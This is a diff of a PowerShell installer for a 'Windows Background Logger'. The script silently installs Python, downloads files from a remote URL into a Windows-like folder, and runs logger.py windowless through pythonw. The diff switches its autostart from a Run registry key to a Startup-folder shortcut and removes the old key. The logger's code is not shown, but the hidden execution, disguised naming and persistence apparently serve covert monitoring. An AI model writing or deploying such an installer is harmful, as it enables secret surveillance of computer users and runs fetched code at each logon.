@@ -1,6 +1,6 @@
 # =============================================
 #   Windows Automated Background Logger Setup
-#   (Fully Dynamic - Works on Any Computer)
+#   (Final Version - Uses Startup Folder Shortcut)
 # =============================================
 
 $installDir = "$env:LOCALAPPDATA\WindowsLogger"
@@ -38,7 +38,6 @@ if (-not $pythonInstalled) {
     Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -PassThru | Out-Null
     
     Remove-Item $installerPath -Force
-    
     $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
     Write-Host "[+] Python installed successfully!" -ForegroundColor Green
 }
@@ -50,7 +49,7 @@ try {
     Invoke-WebRequest -Uri $reqUrl -OutFile "$installDir\requirements.txt" -TimeoutSec 30
     Write-Host "[+] Files downloaded successfully." -ForegroundColor Green
 } catch {
-    Write-Host "[-] Failed to download files! Check your internet connection." -ForegroundColor Red
+    Write-Host "[-] Failed to download files!" -ForegroundColor Red
     Exit
 }
 
@@ -70,16 +69,16 @@ if ($LASTEXITCODE -eq 0) {
     python -m pip install -r requirements.txt --no-cache-dir --timeout 200 --retries 15
 }
 
-# 4. Create Dynamic start_logger.bat (No Hardcoded Username)
+# 4. Create Dynamic start_logger.bat
 Write-Host "[*] Creating dynamic startup batch file..." -ForegroundColor Yellow
 
 $batContent = @'
 @echo off
-:: Dynamic Logger Starter - Works on any Windows user
+:: Dynamic Logger Starter
 
 set "SCRIPT=%LOCALAPPDATA%\WindowsLogger\logger.py"
 
-:: Find pythonw.exe dynamically
+:: Find pythonw.exe
 set "PYTHONW="
 for %%i in (pythonw.exe) do set "PYTHONW=%%~$PATH:i"
 if not defined PYTHONW (
@@ -95,17 +94,27 @@ if exist "%PYTHONW%" (
 
 $batPath = "$installDir\start_logger.bat"
 $batContent | Out-File -FilePath $batPath -Encoding UTF8 -Force
+Write-Host "[+] Batch file created." -ForegroundColor Green
 
-Write-Host "[+] Dynamic batch file created successfully." -ForegroundColor Green
+# 5. Create Shortcut in Startup Folder (Most Reliable Method)
+Write-Host "[*] Adding shortcut to Startup Folder..." -ForegroundColor Yellow
 
-# 5. Add .bat file to Windows Startup
-Write-Host "[*] Adding to Windows Startup..." -ForegroundColor Yellow
+$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$shortcutPath = "$startupFolder\WindowsLogger.lnk"
 
-$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $runKey -Name "WindowsBackgroundLogger" -Value "`"$batPath`"" -ErrorAction SilentlyContinue
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+$Shortcut.TargetPath = $batPath
+$Shortcut.WorkingDirectory = $installDir
+$Shortcut.Save()
+
+Write-Host "[+] Shortcut added to Startup folder successfully." -ForegroundColor Green
+
+# 6. Remove old Registry entry (if exists)
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsBackgroundLogger" -ErrorAction SilentlyContinue
 
 Write-Host "=============================================" -ForegroundColor Green
-Write-Host "[✓] Setup completed successfully! Logger is now active." -ForegroundColor Green
-Write-Host "[i] Installation folder: $installDir" -ForegroundColor Cyan
-Write-Host "[i] Startup method: Dynamic start_logger.bat" -ForegroundColor Cyan
+Write-Host "[✓] Setup completed successfully!" -ForegroundColor Green
+Write-Host "[i] Installation folder : $installDir" -ForegroundColor Cyan
+Write-Host "[i] Startup method      : Shortcut in Startup Folder" -ForegroundColor Cyan
 Write-Host "=============================================" -ForegroundColor Green
